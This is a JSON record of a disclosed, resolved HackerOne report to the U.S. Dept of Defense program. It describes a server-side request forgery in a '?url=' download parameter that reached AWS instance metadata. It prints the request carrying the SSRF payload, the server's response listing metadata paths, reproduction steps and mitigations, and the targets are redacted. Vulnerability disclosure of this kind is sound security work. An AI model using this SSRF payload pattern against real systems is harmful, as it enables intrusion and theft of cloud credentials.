{
  "id": 1623685,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjIzNjg1",
  "url": "https://hackerone.com/reports/1623685",
  "title": "SSRF ACCESS AWS METADATA - █████",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-07-04T05:59:09.308Z",
  "submitted_at": "2022-07-04T05:59:09.329Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "0xr3dhunt",
    "url": "/0xr3dhunt",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/wkhjeiyfz6qwq1m9yco8fp2yfnjv/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-09-14T20:35:27.718Z",
  "bug_reporter_agreed_on_going_public_at": "2022-08-04T16:41:44.018Z",
  "team_member_agreed_on_going_public_at": "2022-09-14T20:35:27.615Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Security Team,\nBased on https://hackerone.com/hack-us-h1c challenge, I have urgent vulnerability and the challenge doesn't accept reprots for now 1:56 AM \n.\nI have found a SSRF Vulnerability which allow access to the AWS metadata, using Parameter `?url=` as shown blew\nAn attacker can tunnel into internal networks and access sensitive internal data such as AWS meta data information.\n\n.\n**Http Request**\n```http\nGET /api/v1/download-url?url=http://█████/latest/meta-data/ HTTP/1.1\nHost: ████████\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nAccess-Control-Allow-Origin: *\nReferer: https://████/\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\nConnection: close\n\n\n```\n.\n**Http Response**\n```http\nHTTP/1.1 200 OK\nServer: nginx/1.21.6\nDate: Mon, 04 Jul 2022 05:42:12 GMT\nContent-Type: text/plain\nConnection: close\nStrict-Transport-Security: max-age=31536000; includeSubdomains\nX-Frame-Options: DENY\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nContent-Security-Policy: object-src 'none'; script-src 'unsafe-inline' 'unsafe-eval' 'strict-dynamic' https: http:;\nFront-End-Https: on\nContent-Length: 313\n\nami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/\nevents/\nhostname\nidentity-credentials/\ninstance-action\ninstance-id\ninstance-life-cycle\ninstance-type\nlocal-hostname\nlocal-ipv4\nmac\nmetrics/\nnetwork/\nplacement/\nprofile\npublic-hostname\npublic-ipv4\npublic-keys/\nreservation-id\nsecurity-groups\nservices/\n```\n.\n.\n**SCREEN SHOT**\n████\n.\n.\n\n## Impact\n\nSSRF Vulnerability \nRemote Access to AWS metadata\n\n## System Host(s)\n█████\n\n## Affected Product(s) and Version(s)\n\n\n## CVE Numbers\n\n\n## Steps to Reproduce\n1 - Visit https://██████████\n2 - Press 'Import from URL' Button & Enter SSRF Payload in the Dialog Box\n3 - Intercept the Request & observe the response\n\n## Suggested Mitigation/Remediation Actions\nSanitize user supplied input in paramter `?url=`\nBlock access to internal networks\n\n",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 5,
  "voters": [
    "zy9ard3",
    "0xr3dhunt",
    "0xbartita",
    "diaaa",
    "th3ak_"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
